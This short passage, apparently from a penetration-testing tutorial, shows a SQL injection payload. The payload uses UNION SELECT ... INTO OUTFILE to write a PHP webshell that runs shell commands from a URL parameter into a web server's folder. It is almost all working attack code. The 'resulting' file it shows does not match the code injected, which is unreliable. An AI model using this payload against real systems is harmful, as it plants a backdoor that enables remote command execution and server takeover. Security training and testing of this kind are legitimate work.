We'll issue the **UNION SELECT** SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder.
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

The written PHP code file results in the following:
```
<? system($_REQUEST['cmd']); ?>
```
